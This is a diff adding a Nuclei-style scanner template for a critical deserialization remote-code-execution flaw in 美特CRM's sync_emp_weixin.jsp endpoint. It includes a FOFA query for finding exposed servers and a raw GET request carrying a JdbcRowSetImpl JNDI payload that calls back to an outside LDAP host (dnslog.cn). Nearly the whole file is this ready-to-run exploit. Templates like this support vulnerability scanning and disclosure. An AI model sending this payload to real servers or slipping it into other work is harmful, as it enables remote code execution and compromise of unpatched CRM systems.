@@ -1,0 +1,19 @@
+id: poc-xfdgcpk4vi8lic4c
+info:
+  name: 美特CRM sync_emp_weixin存在反序列化漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xfdgcpk4vi8lic4c'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xfdgcpk4vi8lic4c
+    fofa: body="/common/scripts/basic.js"
+http:
+- raw:
+  - GET /weixin/admin/sync_emp_weixin.jsp?emp_json=[{%22@type%22:%22[com.sun.rowset.JdbcRowSetImpl%22[{,%22dataSourceName%22:%22ldap://dnslog.cn%22,%22autoCommit%22:true}] HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
